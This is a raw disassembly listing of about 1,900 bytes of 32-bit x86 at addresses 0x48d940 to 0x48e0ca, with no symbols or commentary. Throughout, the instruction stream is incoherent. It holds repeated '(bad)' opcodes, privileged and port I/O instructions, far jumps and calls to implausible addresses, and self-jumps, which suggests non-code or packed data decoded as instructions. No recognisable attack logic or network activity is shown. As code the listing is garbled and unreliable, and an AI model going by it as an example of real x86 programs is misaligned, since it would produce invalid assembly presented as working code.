  48d940:	sbb    ch,bh
  48d942:	mov    esi,DWORD PTR [edi+0x38]
  48d945:	mov    ebx,DWORD PTR [edi+0x3c]
  48d948:	rcr    BYTE PTR [esi],0x86
  48d94b:	jg     0x48d90d
  48d94d:	aas    
  48d94e:	pop    ss
  48d94f:	lock mov esp,0x76347f8b
  48d955:	(bad)  
  48d956:	not    edx
  48d958:	and    edx,ecx
  48d95a:	ss loopne 0x48d91c
  48d95d:	test   al,0xfd
  48d95f:	and    eax,esi
  48d961:	or     edx,eax
  48d963:	add    edx,edi
  48d965:	cmp    al,0xbc
  48d967:	pop    eax
  48d968:	add    bh,BYTE PTR [eax-0x5c]
  48d96b:	push   0xffffffd7
  48d96d:	rol    eax,0x7
  48d970:	add    ecx,DWORD PTR [edi*8-0x1234fc7]
  48d977:	and    ecx,DWORD PTR [edx]
  48d979:	inc    eax
  48d97a:	ror    DWORD PTR [ebx],cl
  48d97c:	xlat   BYTE PTR ds:[ebx]
  48d97d:	add    edx,ebx
  48d97f:	sti    
  48d980:	mov    bl,BYTE PTR [edi-0x58]
  48d983:	mov    WORD PTR [edx],cs
  48d985:	push   esi
  48d986:	mov    bh,0xc7
  48d988:	call   0xc84be64b
  48d98d:	mov    edx,ecx
  48d98f:	sub    al,0xd6
  48d991:	repnz lods eax,DWORD PTR ds:[esi]
  48d993:	loop   0x48d954
  48d995:	xor    eax,DWORD PTR [eax+0x35]
  48d998:	les    ecx,FWORD PTR [ebp+0x70db1a94]
  48d99e:	and    BYTE PTR [ecx+eax*8],ah
  48d9a1:	int3   
  48d9a2:	add    ebx,DWORD PTR [eax-0x90527]
  48d9a8:	std    
  48d9a9:	and    ebx,edx
  48d9ab:	mov    edi,edx
  48d9ad:	not    edi
  48d9af:	xor    al,0xfb
  48d9b1:	add    edi,DWORD PTR [ebp-0x38]
  48d9b4:	lea    esi,[edi+esi*1+0x68bdceee]
  48d9bb:	into   
  48d9bc:	or     al,BYTE PTR [ebx]
  48d9be:	repnz mov edx,edi
  48d9c1:	imul   BYTE PTR [edi-0x51]
  48d9c4:	dec    edx
  48d9c5:	not    esi
  48d9c7:	and    esi,ecx
  48d9c9:	cmp    ah,BYTE PTR [ebx]
  48d9cb:	jge    0x48d9d9
  48d9cd:	or     esi,edi
  48d9cf:	add    esi,DWORD PTR [ebp-0x34]
  48d9d2:	fiadd  DWORD PTR [esi]
  48d9d4:	scas   eax,DWORD PTR es:[edi]
  48d9d5:	(bad)  
  48d9d7:	cmc    
  48d9d8:	jmp    0x48d9d8
  48d9da:	int    0xcc
  48d9dc:	push   esp
  48d9dd:	loope  0x48d9d7
  48d9df:	ins    BYTE PTR es:[edi],dx
  48d9e0:	cli    
  48d9e1:	mov    ebx,esi
  48d9e3:	and    ebx,eax
  48d9e5:	jne    0x48d9b7
  48d9e7:	loopne 0x48d9b6
  48d9e9:	sahf   
  48d9ea:	lea    edi,[edi+ecx*1+0x2a]
  48d9ee:	mov    BYTE PTR [edi-0x4dcb06b9],0xfe
  48d9f5:	xor    eax,0xe5b033d4
  48d9fa:	fwait
  48d9fb:	adc    al,0xe4
  48d9fd:	pop    ss
  48d9fe:	adc    eax,DWORD PTR [esi+0x30]
  48da01:	test   al,0xe1
  48da03:	fdiv   st,st(2)
  48da05:	out    0x0,eax
  48da07:	stc    
  48da08:	add    DWORD PTR [ebp-0x272302ba],edx
  48da0e:	cwde   
  48da0f:	sub    BYTE PTR [ecx-0x4],0xe9
  48da13:	mov    dl,0x1b
  48da15:	aam    0xe9
  48da17:	loope  0x48d9f9
  48da19:	scas   eax,DWORD PTR es:[edi]
  48da1a:	test   DWORD PTR [ebx+ecx*4+0x7e],0xdc86cef9
  48da22:	in     al,0xe1
  48da24:	in     al,0xb1
  48da26:	pop    ebx
  48da27:	(bad)  
  48da28:	inc    DWORD PTR [eax-0x17b71f04]
  48da2e:	ret    0xd7be
  48da31:	pop    esp
  48da32:	mov    DWORD PTR [edi+0x2],esp
  48da35:	stc    
  48da36:	jae    0x48da24
  48da38:	and    dl,BYTE PTR [ecx]
  48da3a:	nop
  48da3b:	imul   esi,eax,0xffffffe9
  48da3e:	dec    ebp
  48da3f:	dec    edi
  48da40:	repnz xchg ebx,eax
  48da42:	jno    0x48d9dc
  48da44:	std    
  48da45:	fbld   TBYTE PTR [ebx]
  48da47:	fsubp  st(2),st
  48da49:	and    esi,eax
  48da4b:	or     ebx,esi
  48da4d:	enter  0xf2de,0xad
  48da51:	and    al,0xf4
  48da53:	loopne 0x48da68
  48da55:	mov    es,WORD PTR [ebx+0x79]
  48da58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48da59:	data16 repnz mov al,0x18
  48da5d:	ins    DWORD PTR es:[edi],dx
  48da5e:	pop    es
  48da5f:	xor    ebp,DWORD PTR [esi+esi*1-0x4b0cf441]
  48da66:	clc    
  48da67:	mov    ebx,0xc2137cb7
  48da6c:	hlt    
  48da6d:	push   ds
  48da6e:	and    DWORD PTR [eax],ecx
  48da70:	mov    ah,0x49
  48da72:	fisubr WORD PTR cs:[ecx+0x35a68bc0]
  48da79:	lds    esi,FWORD PTR [edi+0x6207e8da]
  48da7f:	and    eax,0x5cf8f61e
  48da84:	(bad)  
  48da85:	in     al,dx
  48da86:	add    eax,0x667f34f0
  48da8b:	fst    st(4)
  48da8d:	inc    eax
  48da8e:	mov    bl,0x40
  48da90:	ror    BYTE PTR [ecx],0xfe
  48da93:	pop    es
  48da94:	aas    
  48da95:	sbb    BYTE PTR [esi-0x7f],ah
  48da98:	imul   ebp,eax,0x5e5a51ba
  48da9e:	es aas 
  48daa0:	(bad)  
  48daa2:	jbe    0x48da95
  48daa4:	stc    
  48daa5:	rol    edx,0xe
  48daa8:	mov    ds,edx
  48daaa:	imul   edi,DWORD PTR [esi+eax*2-0x6438553e],0x5d
  48dab2:	sbb    cl,ah
  48dab4:	mov    dh,0xe9
  48dab6:	cs repnz cli 
  48dab9:	imul   edx,eax,0xffffffd0
  48dabc:	sbb    al,0x17
  48dabe:	loope  0x48dabb
  48dac0:	pop    ebp
  48dac1:	adc    BYTE PTR [edi],ch
  48dac3:	(bad)  
  48dac4:	(bad)  
  48dac5:	mov    esi,edx
  48dac7:	ret    0xd0f7
  48daca:	xchg   edx,eax
  48dacb:	gs sbb eax,0xc7f909c0
  48dad1:	add    edi,DWORD PTR [esi-0x26841d02]
  48dad7:	jnp    0x48db35
  48dad9:	jle    0x48daef
  48dadb:	inc    esp
  48dadc:	add    ch,dh
  48dade:	jmp    0xee0a23c8
  48dae3:	in     al,dx
  48dae4:	fdivr  st,st(3)
  48dae6:	xor    edi,eax
  48dae8:	and    esi,0x6fe1d8a1
  48daee:	int3   
  48daef:	(bad)  
  48daf0:	out    dx,al
  48daf1:	pop    ebp
  48daf2:	sub    al,0xdf
  48daf4:	loop   0x48db26
  48daf6:	enter  0xd3fb,0xe7
  48dafa:	or     al,cl
  48dafc:	fs ret 0x535
  48db00:	repnz int 0xa1
  48db03:	loopne 0x48dae9
  48db05:	call   0xe216c142
  48db0a:	and    ebp,ecx
  48db0c:	adc    dh,dl
  48db0e:	retf   
  48db0f:	hlt    
  48db10:	(bad)  
  48db11:	pop    es
  48db12:	aaa    
  48db13:	ret    
  48db14:	loope  0x48dade
  48db16:	pop    edi
  48db17:	es in  al,0xcf
  48db1a:	imul   eax
  48db1c:	xchg   DWORD PTR ds:0xeddcf4d5,ecx
  48db22:	adc    al,0x5a
  48db24:	inc    edi
  48db25:	cmp    cl,bl
  48db27:	xchg   esi,eax
  48db28:	inc    ebp
  48db29:	in     eax,0xf4
  48db2b:	jmp    0xc931e120
  48db30:	das    
  48db31:	pop    ss
  48db32:	enter  0xa9e3,0xc4
  48db36:	clc    
  48db37:	mov    ds:0xfb31fcef,eax
  48db3c:	xor    eax,DWORD PTR [ebx]
  48db3e:	fsub   st,st(4)
  48db40:	fld    DWORD PTR [edx]
  48db42:	outs   dx,DWORD PTR ds:[esi]
  48db43:	addr16 imul cl
  48db46:	sti    
  48db47:	ins    DWORD PTR es:[edi],dx
  48db48:	jg     0x48db81
  48db4a:	in     al,dx
  48db4b:	mov    dl,0xea
  48db4d:	mov    cl,BYTE PTR [edx+ebp*1-0x73]
  48db51:	loopne 0x48db86
  48db53:	ret    0x33f3
  48db56:	(bad)  
  48db57:	mov    ?,WORD PTR cs:[edi-0x232fa033]
  48db5e:	inc    edx
  48db5f:	cmp    edx,edi
  48db61:	inc    DWORD PTR [ebx+eax*1]
  48db64:	retf   0xfe33
  48db67:	xor    edi,eax
  48db69:	pop    edx
  48db6a:	loop   0x48db95
  48db6c:	int    0x9f
  48db6e:	fadd   QWORD PTR [ecx+0xb8771f6]
  48db74:	sub    esi,ecx
  48db76:	mov    dh,0xd3
  48db78:	(bad)  
  48db79:	jno    0x48db9d
  48db7b:	popa   
  48db7c:	popf   
  48db7d:	ins    DWORD PTR es:[edi],dx
  48db7e:	scas   al,BYTE PTR es:[edi]
  48db7f:	adc    BYTE PTR [eax],ch
  48db81:	cli    
  48db82:	mov    DWORD PTR [edx-0x8961cd1],esp
  48db88:	mov    esi,esp
  48db8a:	data16 or al,0x38
  48db8d:	in     eax,0xfd
  48db8f:	shr    BYTE PTR [edx+0xffffe09],0xe4
  48db96:	(bad)  [edx]
  48db98:	stos   BYTE PTR es:[edi],al
  48db99:	pop    es
  48db9a:	inc    esp
  48db9b:	jmp    0xfbc:0x8dcca4be
  48dba2:	test   eax,0xc14bdecf
  48dba7:	(bad)  
  48dba8:	lods   eax,DWORD PTR ds:[esi]
  48dba9:	jmp    0xcfab0bdd
  48dbae:	xor    ecx,esi
  48dbb0:	xor    ecx,eax
  48dbb2:	add    ecx,DWORD PTR [ebp+0x28]
  48dbb5:	fild   QWORD PTR [esi-0x4ba8beef]
  48dbbb:	repnz pusha 
  48dbbd:	dec    ebx
  48dbbe:	mov    ebx,0xdc33d7f6
  48dbc3:	retf   
  48dbc4:	sub    eax,0xcdf202e4
  48dbc9:	outs   dx,DWORD PTR ds:[esi]
  48dbca:	jg     0x48dbfd
  48dbcc:	jo     0x48db8a
  48dbce:	mov    edi,0xa2c9c1be
  48dbd3:	retf   0xd933
  48dbd6:	add    ebx,DWORD PTR [ebp-0x10]
  48dbd9:	add    eax,esi
  48dbdb:	jle    0x48db78
  48dbdd:	sub    ch,bh
  48dbdf:	lods   eax,DWORD PTR ds:[esi]
  48dbe0:	call   0xc8d49d9b
  48dbe5:	icebp  
  48dbe6:	xor    esi,eax
  48dbe8:	xor    BYTE PTR [esp+esi*8-0x5ed805c2],bh
  48dbef:	jmp    0x8335:0xd37cc6c1
  48dbf6:	mov    ds:0xcdf9c874,al
  48dbfb:	enter  0x8517,0x30
  48dbff:	out    dx,eax
  48dc00:	aam    0x2e
  48dc02:	adc    cl,BYTE PTR [ecx-0x33]
  48dc05:	sahf   
  48dc06:	(bad)  
  48dc07:	(bad)  
  48dc09:	fidiv  DWORD PTR [ebx]
  48dc0b:	fcomp  DWORD PTR [ebp+0x4d]
  48dc0e:	stc    
  48dc0f:	(bad)  
  48dc10:	adc    ah,0xa2
  48dc13:	or     eax,DWORD PTR ds:0xf604881d
  48dc19:	rcl    DWORD PTR [eax+eiz*8+0xfed7ed],1
  48dc20:	add    BYTE PTR [ecx],bh
  48dc22:	rcl    ah,1
  48dc24:	(bad)  [ebx+0x33abd1e8]
  48dc2a:	shr    BYTE PTR [eax],1
  48dc2c:	in     al,dx
  48dc2d:	xchg   BYTE PTR ds:0x321805f3,dh
  48dc33:	in     eax,0x99
  48dc35:	(bad)  
  48dc37:	mov    ds:0xdf8cdd0,al
  48dc3c:	inc    ecx
  48dc3d:	xor    edi,DWORD PTR [edi-0x8]
  48dc40:	jl     0x48dbe4
  48dc42:	pop    ds
  48dc43:	mov    ds:0x6c49bf2,al
  48dc48:	pop    ebx
  48dc49:	push   ebp
  48dc4a:	mov    esi,0x56650f9e
  48dc4f:	lods   al,BYTE PTR ds:[esi]
  48dc50:	(bad)  
  48dc51:	into   
  48dc52:	inc    edi
  48dc53:	or     edi,ecx
  48dc55:	repz js 0x48dca7
  48dc58:	rcl    DWORD PTR [ebp-0xbd6dd44],0x4e
  48dc5f:	push   es
  48dc60:	(bad)  
  48dc61:	sub    al,0xf8
  48dc63:	dec    edi
  48dc64:	rep ins DWORD PTR es:[edi],dx
  48dc66:	and    DWORD PTR [eax+esi*1],ebp
  48dc69:	scas   al,BYTE PTR es:[edi]
  48dc6a:	pop    ss
  48dc6b:	xchg   edi,eax
  48dc6c:	jmp    FWORD PTR [edx]
  48dc6e:	inc    ebx
  48dc6f:	or     bh,cl
  48dc71:	sahf   
  48dc72:	mul    BYTE PTR [ecx+0x78]
  48dc75:	sub    al,0xfa
  48dc77:	ja     0x48dc20
  48dc79:	and    edx,DWORD PTR [ebx+ebp*4+0x69f80fb2]
  48dc80:	(bad)  
  48dc81:	xor    al,0xed
  48dc83:	sub    al,0xb6
  48dc85:	cli    
  48dc86:	sar    BYTE PTR [ecx],1
  48dc88:	mov    al,ds:0x5c0bfc93
  48dc8d:	enter  0x19f,0xec
  48dc91:	ret    
  48dc92:	pop    ecx
  48dc93:	pop    ebx
  48dc94:	gs enter 0xb33f,0xe7
  48dc99:	(bad)  
  48dc9a:	xchg   edx,eax
  48dc9b:	int3   
  48dc9c:	or     al,0x8f
  48dc9e:	lods   eax,DWORD PTR ds:[esi]
  48dc9f:	mov    edi,0xf47de4b7
  48dca4:	out    dx,eax
  48dca5:	test   esp,edi
  48dca7:	mov    ecx,0xd1c0ff90
  48dcac:	pop    ebp
  48dcad:	test   BYTE PTR [ebp-0x301bd181],al
  48dcb3:	fmul   QWORD PTR [edi+0x7e]
  48dcb6:	test   al,0x6f
  48dcb8:	clc    
  48dcb9:	loopne 0x48dca1
  48dcbb:	sub    al,0xfe
  48dcbd:	or     edi,ecx
  48dcbf:	jae    0x48dce2
  48dcc1:	aam    0x14
  48dcc3:	inc    ebx
  48dcc4:	add    DWORD PTR [ebx-0x7403321e],esp
  48dcca:	lock ret 0x11a1
  48dcce:	or     BYTE PTR [esi-0x3f],cl
  48dcd1:	iret   
  48dcd2:	fs retf 0xd1f7
  48dcd6:	or     esi,DWORD PTR [edi-0x1b]
  48dcd9:	pop    ebx
  48dcda:	(bad)
  48dcdd:	int3   
  48dcde:	mov    dh,0x1
  48dce0:	cmp    BYTE PTR [esi+0x53],0xf7
  48dce4:	(bad)  
  48dce5:	mov    ecx,esi
  48dce7:	sub    al,0x1c
  48dce9:	neg    DWORD PTR [edi]
  48dceb:	out    0xc8,al
  48dced:	xor    ecx,edi
  48dcef:	mov    al,ds:0x3af23511
  48dcf4:	mov    ebp,0x845f1aae
  48dcf9:	push   ss
  48dcfa:	iret   
  48dcfb:	mov    dl,0x2c
  48dcfd:	retf   0xc4f5
  48dd00:	shl    BYTE PTR [ecx+esi*1-0xb282d45],0x1b
  48dd08:	std    
  48dd09:	test   eax,0x3459102a
  48dd0e:	add    ebp,DWORD PTR [eax+0x6fc60bcf]
  48dd14:	(bad)  
  48dd15:	stc    
  48dd16:	dec    edx
  48dd17:	outs   dx,BYTE PTR ds:[esi]
  48dd18:	mov    DWORD PTR cs:[ecx+0x34],ebx
  48dd1c:	xchg   ecx,eax
  48dd1d:	rol    DWORD PTR [esi-0x33373e15],cl
  48dd23:	inc    ecx
  48dd24:	cmp    BYTE PTR [edx+0x0],ch
  48dd27:	jae    0x48dcfc
  48dd29:	fisttp QWORD PTR [esi+0x4e]
  48dd2c:	or     al,0x8b
  48dd2e:	inc    ecx
  48dd2f:	cmp    al,0xf
  48dd31:	cmp    al,0x40
  48dd33:	add    eax,edx
  48dd35:	add    DWORD PTR [ebp-0x5bfbf18],0x104e0951
  48dd3f:	popa   
  48dd40:	or     ah,BYTE PTR [ebx+0x56]
  48dd43:	enter  0xfdc7,0x22
  48dd47:	fadd   QWORD PTR [edi+edx*2+0x38c0705f]
  48dd4e:	shl    esi,0x8
  48dd51:	or     esi,edi
  48dd53:	inc    esp
  48dd54:	js     0x48dd6f
  48dd56:	mov    dh,0xe
  48dd58:	js     0x48dd59
  48dd5a:	adc    esi,edi
  48dd5c:	mov    DWORD PTR [ecx],esi
  48dd5e:	in     al,0x2
  48dd60:	inc    ecx
  48dd61:	jbe    0x48dd74
  48dd63:	lock dec edx
  48dd65:	jne    0x48dd3e
  48dd67:	xchg   bh,bh
  48dd69:	xor    eax,0x579c6d8e
  48dd6e:	push   eax
  48dd6f:	in     eax,0x17
  48dd71:	and    eax,0x2ff48c4b
  48dd76:	jg     0x48dd28
  48dd78:	add    esi,0x68
  48dd7b:	test   al,0xab
  48dd7d:	aas    
  48dd7e:	stc    
  48dd7f:	imul   esi,ecx,0x46c0acf2
  48dd85:	aaa    
  48dd86:	xchg   BYTE PTR [esi-0x57],dl
  48dd89:	imul   edx,esp,0x8cf46bc6
  48dd8f:	push   edi
  48dd90:	push   edi
  48dd91:	inc    ebp
  48dd92:	xor    al,0x6c
  48dd94:	xor    BYTE PTR [ecx],ah
  48dd96:	jbe    0x48dd55
  48dd98:	ret    0xc204
  48dd9b:	add    esi,eax
  48dd9d:	push   edi
  48dd9e:	push   esi
  48dd9f:	cmc    
  48dda0:	adc    dl,dl
  48dda2:	xor    BYTE PTR [edi],al
  48dda4:	iret   
  48dda5:	mov    bh,0x1e
  48dda7:	adc    DWORD PTR [edi],0x1cd0c1f2
  48ddad:	or     ebp,esp
  48ddaf:	cmp    DWORD PTR [ebx],0xffffffb8
  48ddb2:	push   ebx
  48ddb3:	sar    BYTE PTR [ebx+0x20],0x2c
  48ddb7:	(bad)  
  48ddb8:	pop    ebp
  48ddb9:	add    edx,esp
  48ddbb:	mov    ebp,0xc2f0013b
  48ddc0:	sub    DWORD PTR [edi],0xa38fa26
  48ddc6:	outs   dx,DWORD PTR ds:[esi]
  48ddc7:	sub    eax,0xfafc1c3a
  48ddcc:	fild   QWORD PTR [ebp+0xd080190]
  48ddd2:	and    eax,0x5f20438b
  48ddd7:	dec    eax
  48ddd8:	mov    esp,0x3905a8aa
  48dddd:	fbstp  TBYTE PTR [ebp+0x4d]
  48dde0:	and    BYTE PTR [edx],al
  48dde2:	inc    ecx
  48dde3:	inc    ecx
  48dde4:	lods   eax,DWORD PTR ds:[esi]
  48dde5:	adc    DWORD PTR [eax],0x7699e0f2
  48ddeb:	pop    esp
  48ddec:	sbb    ebp,DWORD PTR [ebx+0x177f18b1]
  48ddf2:	cmp    al,0x6a
  48ddf4:	mov    bl,0x66
  48ddf6:	or     BYTE PTR [esi-0x54],al
  48ddf9:	je     0x48de65
  48ddfb:	pop    ebx
  48ddfc:	jae    0x48de1b
  48ddfe:	push   es
  48ddff:	push   edi
  48de00:	and    DWORD PTR [edi+0x28],ebx
  48de03:	sub    bh,BYTE PTR [edi+ebp*1]
  48de06:	mov    ebp,0x88aa2ecb
  48de0b:	and    al,0x32
  48de0d:	dec    edx
  48de0e:	push   esi
  48de0f:	jmp    0x48de35
  48de11:	or     al,0x4e
  48de13:	pop    edx
  48de14:	imul   BYTE PTR [eax]
  48de16:	test   BYTE PTR [ebx+0x183e3d76],cl
  48de1c:	js     0x48de9b
  48de1e:	xchg   ebp,eax
  48de1f:	push   esi
  48de20:	push   ebx
  48de21:	push   edx
  48de22:	jg     0x48ddda
  48de24:	sbb    ch,al
  48de26:	sub    al,0x3d
  48de28:	push   esi
  48de29:	ss test cl,0x2d
  48de2d:	cld    
  48de2e:	pushf  
  48de2f:	push   0x35
  48de31:	push   edx
  48de32:	data16 ss jp 0x48de3a
  48de36:	hlt    
  48de37:	arpl   WORD PTR [eax],di
  48de39:	or     BYTE PTR [esi+0x56],dl
  48de3c:	push   eax
  48de3d:	pop    eax
  48de3e:	shr    BYTE PTR [eax+edx*2+0x446a450b],1
  48de45:	inc    BYTE PTR [eax]
  48de47:	fdivr  st,st(3)
  48de49:	jmp    0x48de6b
  48de4b:	popf   
  48de4c:	not    BYTE PTR [edx-0x58]
  48de4f:	adc    BYTE PTR [ecx+0x1e],0xa5
  48de53:	sbb    al,0x2a
  48de55:	ins    BYTE PTR es:[edi],dx
  48de56:	aaa    
  48de57:	test   DWORD PTR [ecx],esi
  48de59:	push   eax
  48de5a:	push   edi
  48de5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48de5c:	cmp    al,0x8f
  48de5e:	inc    eax
  48de5f:	outs   dx,DWORD PTR ds:[esi]
  48de60:	cwde   
  48de61:	add    esp,edi
  48de63:	push   es
  48de64:	lods   eax,DWORD PTR ds:[esi]
  48de65:	push   edi
  48de66:	jo     0x48de29
  48de68:	out    0xce,al
  48de6a:	push   edx
  48de6b:	adc    al,0x51
  48de6d:	inc    eax
  48de6e:	shr    BYTE PTR [ecx-0x760df4d8],cl
  48de74:	jo     0x48de8b
  48de76:	cld    
  48de77:	mov    WORD PTR [ebp+0x7edf92b8],cs
  48de7d:	jle    0x48ded9
  48de7f:	add    DWORD PTR [eax],eax
  48de81:	mov    al,0x1
  48de83:	xor    al,0xfe
  48de85:	push   0x3
  48de87:	das    
  48de88:	or     eax,0xf8e60fb5
  48de8d:	push   0x0
  48de8f:	jg     0x48dec1
  48de91:	ror    BYTE PTR [edi+ecx*2],1
  48de94:	out    0xe0,al
  48de96:	sbb    al,0xf4
  48de98:	lock rcr al,0xb5
  48de9c:	test   eax,0xa1d80bf0
  48dea1:	mov    esp,0xd80636a
  48dea6:	mov    WORD PTR [ebx-0x5b972c06],es
  48deac:	imul   ecx,DWORD PTR [ebx],0xa31e83e3
  48deb2:	inc    eax
  48deb3:	pop    edx
  48deb4:	and    al,0x15
  48deb6:	arpl   cx,sp
  48deb8:	bnd jae 0x48de5d
  48debb:	push   edx
  48debc:	mov    ds:0x4e88a348,eax
  48dec1:	sar    DWORD PTR [ebx],1
  48dec3:	sbb    BYTE PTR [ebp-0x80],ch
  48dec6:	js     0x48dee7
  48dec8:	add    dh,al
  48deca:	gs (bad) 
  48decc:	les    ebp,FWORD PTR [eax-0x38]
  48decf:	jae    0x48df33
  48ded1:	push   esi
  48ded2:	sbb    BYTE PTR [edx],al
  48ded4:	add    DWORD PTR [edx-0x49884c70],ebx
  48deda:	push   ecx
  48dedb:	(bad)  
  48dedc:	pop    esp
  48dedd:	and    eax,0x8e993a7d
  48dee2:	rcr    DWORD PTR [edx],cl
  48dee4:	inc    esp
  48dee5:	mov    ah,0x50
  48dee7:	ror    BYTE PTR [edx-0x784d63bc],1
  48deed:	fcmove st,st(6)
  48deef:	shl    BYTE PTR [eax],1
  48def1:	or     al,0xd4
  48def3:	and    esi,DWORD PTR [esi*2+0x7a0304dc]
  48defa:	sbb    ebp,DWORD PTR [eax+0x4ba45d7a]
  48df00:	xor    eax,0xd6dc87eb
  48df05:	adc    BYTE PTR [ebp+0x1e],cl
  48df08:	dec    ebp
  48df09:	push   0xffffffa0
  48df0b:	inc    ecx
  48df0c:	pop    ss
  48df0d:	inc    ecx
  48df0e:	xchg   edx,eax
  48df0f:	loopne 0x48df21
  48df11:	inc    eax
  48df12:	jl     0x48df00
  48df14:	ret    
  48df15:	xor    eax,0x9159cfe9
  48df1a:	mov    ds:0x8fa17ee4,ax
  48df20:	inc    eax
  48df21:	cmp    dl,BYTE PTR [ebp-0xbf7996a]
  48df27:	(bad)
  48df2b:	aas    
  48df2c:	mov    ebx,0xba472e1a
  48df31:	sbb    ecx,DWORD PTR [eax]
  48df33:	mov    ds:0xc8f18684,eax
  48df38:	int3   
  48df39:	sub    edx,esp
  48df3b:	xchg   ecx,eax
  48df3c:	loope  0x48dfa7
  48df3e:	lock mov esi,0xe445051e
  48df44:	dec    edi
  48df45:	sti    
  48df46:	sbb    BYTE PTR [esi-0x1e],ch
  48df49:	mov    esp,0xc8554ca0
  48df4e:	push   edx
  48df4f:	sub    dl,BYTE PTR ds:0xec465bf4
  48df55:	fmul   QWORD PTR [ebp-0x20]
  48df58:	out    dx,al
  48df59:	inc    ebx
  48df5a:	or     ebp,DWORD PTR [esi+0x70]
  48df5d:	je     0x48df29
  48df5f:	dec    eax
  48df60:	jae    0x48def1
  48df62:	lock inc edi
  48df64:	pop    ds
  48df65:	fidivr DWORD PTR [eax]
  48df67:	pop    es
  48df68:	addr16 push cs
  48df6a:	sbb    al,0xe0
  48df6c:	xchg   edi,eax
  48df6d:	in     eax,dx
  48df6e:	test   eax,0x88a38ffb
  48df73:	mov    BYTE PTR [esi+ecx*8-0x8],0x8
  48df78:	cld    
  48df79:	adc    DWORD PTR [ebx-0x53],0xffffff84
  48df7d:	cmp    esp,ecx
  48df7f:	mov    al,0xa2
  48df81:	cs push eax
  48df83:	push   ss
  48df84:	cmp    BYTE PTR [edx+eax*1-0x5365bcdf],dh
  48df8b:	and    dl,dl
  48df8d:	out    dx,al
  48df8e:	shl    BYTE PTR [eax],cl
  48df90:	and    bl,ah
  48df92:	test   eax,0xf0fc14dc
  48df97:	cld    
  48df98:	xor    al,0xc7
  48df9a:	scas   al,BYTE PTR es:[edi]
  48df9b:	adc    eax,0x946a5017
  48dfa0:	dec    esp
  48dfa1:	test   al,0x89
  48dfa3:	xor    eax,0x668c13e0
  48dfa8:	loopne 0x48dfb1
  48dfaa:	mov    bl,0x6a
  48dfac:	ja     0x48dfbd
  48dfae:	cmp    eax,0x50e88e17
  48dfb3:	fldenv [eax+ebp*2+0x2c]
  48dfb7:	fmul   QWORD PTR [esi]
  48dfb9:	ss int3 
  48dfbb:	pop    ebx
  48dfbc:	scas   eax,DWORD PTR es:[edi]
  48dfbd:	or     edi,ecx
  48dfbf:	sbb    al,0x9a
  48dfc1:	jb     0x48dfe6
  48dfc3:	adc    al,0xf7
  48dfc5:	or     DWORD PTR [edx-0x37],eax
  48dfc8:	dec    edx
  48dfc9:	int    0x7e
  48dfcb:	xchg   ecx,eax
  48dfcc:	int3   
  48dfcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48dfce:	inc    ebp
  48dfcf:	push   0x18b008c4
  48dfd4:	inc    esi
  48dfd5:	and    al,0x67
  48dfd7:	xor    DWORD PTR [eax],esp
  48dfd9:	mov    cs:0xde0ef50a,eax
  48dfdf:	out    dx,eax
  48dfe0:	loop   0x48e05b
  48dfe2:	mov    edx,0x14fa6ae4
  48dfe7:	sub    esp,DWORD PTR [ecx-0x78ad84e8]
  48dfed:	mov    ah,0x12
  48dfef:	xor    bl,bh
  48dff1:	push   esi
  48dff2:	(bad)  
  48dff3:	or     eax,0x8dd000bc
  48dff8:	popa   
  48dff9:	dec    edx
  48dffa:	mov    al,0x3
  48dffc:	push   ds
  48dffd:	sub    ah,BYTE PTR [ebx]
  48dfff:	lea    ecx,[eax+0x4]
  48e002:	mov    ebp,0x49b106eb
  48e007:	pop    esi
  48e008:	pop    ds
  48e009:	mov    edi,0x8b2a1c7
  48e00e:	dec    edx
  48e00f:	lods   eax,DWORD PTR ds:[esi]
  48e010:	jle    0x48e01d
  48e012:	dec    esi
  48e013:	in     al,0x51
  48e015:	fs inc esp
  48e017:	test   ecx,0x40ed6a85
  48e01d:	int    0x70
  48e01f:	pop    eax
  48e020:	inc    esi
  48e021:	sbb    al,0xee
  48e023:	leave  
  48e024:	add    ch,BYTE PTR [ebx]
  48e026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48e027:	es jb  0x48dfee
  48e02a:	pushf  
  48e02b:	xor    ebx,ebx
  48e02d:	mov    al,ds:0x1f70a1af
  48e032:	in     al,0x73
  48e034:	popa   
  48e035:	add    ecx,ebp
  48e037:	dec    ebx
  48e038:	jmp    0xfecac6de
  48e03d:	enter  0xeb7c,0xa1
  48e041:	push   ebx
  48e042:	cli    
  48e043:	je     0x48e094
  48e045:	push   ds
  48e046:	das    
  48e047:	push   0x3cd3b8a1
  48e04c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48e04d:	mov    DWORD PTR [ebp+0x38],eax
  48e050:	sub    eax,0x687c6338
  48e055:	popf   
  48e056:	rcr    BYTE PTR [esi+0x53],cl
  48e059:	mov    esi,?
  48e05b:	(bad)  
  48e05c:	rol    BYTE PTR [ebp+0xc],cl
  48e05f:	pop    edi
  48e060:	cmp    eax,0xfa385a2e
  48e065:	cli    
  48e066:	pop    edx
  48e067:	jmp    0xb32e4fcc
  48e06c:	xchg   esi,eax
  48e06d:	push   0xffffffd5
  48e06f:	js     0x48e057
  48e071:	dec    eax
  48e072:	or     al,0x7e
  48e074:	sbb    DWORD PTR [edi],ecx
  48e076:	test   BYTE PTR [esi+0x3fc397d3],cl
  48e07c:	and    edi,DWORD PTR [edi+0x4b]
  48e07f:	loop   0x48e078
  48e081:	jl     0x48e041
  48e083:	sub    al,0x12
  48e085:	clc    
  48e086:	sbb    al,0xbe
  48e088:	mov    eax,0x4ab7b6f7
  48e08d:	loop   0x48e08b
  48e08f:	mov    edi,0x9c27f5a0
  48e094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48e095:	xchg   al,cl
  48e097:	mov    ebp,0x8cf504ab
  48e09c:	inc    ebx
  48e09d:	or     eax,DWORD PTR [edx+0x694847bc]
  48e0a3:	or     eax,0x3f514490
  48e0a8:	adc    BYTE PTR [edx],dh
  48e0aa:	es jae 0x48e0f8
  48e0ad:	mov    eax,0x8eb1275c
  48e0b2:	xchg   edi,eax
  48e0b3:	xchg   bh,dh
  48e0b5:	mov    esp,0xef78d61f
  48e0ba:	ins    BYTE PTR es:[edi],dx
  48e0bb:	add    BYTE PTR [ebx-0x725e9d53],0xd0
  48e0c2:	popf   
  48e0c3:	out    0x2b,al
  48e0c5:	mov    es,eax
  48e0c7:	xor    BYTE PTR [eax],al
  48e0c9:	pop    esi
  48e0ca:	(bad)  
